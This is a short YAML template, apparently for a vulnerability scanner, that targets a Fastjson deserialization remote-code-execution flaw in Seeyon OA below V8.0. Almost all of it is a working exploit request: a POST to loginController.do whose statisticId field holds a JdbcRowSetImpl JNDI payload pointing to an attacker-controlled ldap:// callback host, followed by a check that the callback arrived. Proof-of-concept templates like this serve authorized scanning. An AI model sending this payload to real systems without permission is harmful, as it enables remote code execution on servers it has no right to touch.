name: Seeyon_OA_Fastjson_loginController.do_RCE
transport: http
detail:
  dock: product="Yonyou-Seeyon-OA"
  product: Yonyou-Seeyon-OA
  homepage: https://www.netentsec.com/
  impact: ''
  description: The old version of Seeyon OA software (below V8.0, V8.0 was released
    on June 11, 2020) integrated Fastjson component has a deserialization vulnerability
set:
  reverse: newReverse()
  exp: "ldap://" + reverse.domain
rules: 
  r1:
    url: /seeyon/m3/loginController.do?method=transLogout
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: "statisticId={\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"%s\", \"autoCommit\":true}\n"
    expression: reverse.wait(5)
expression: r1()
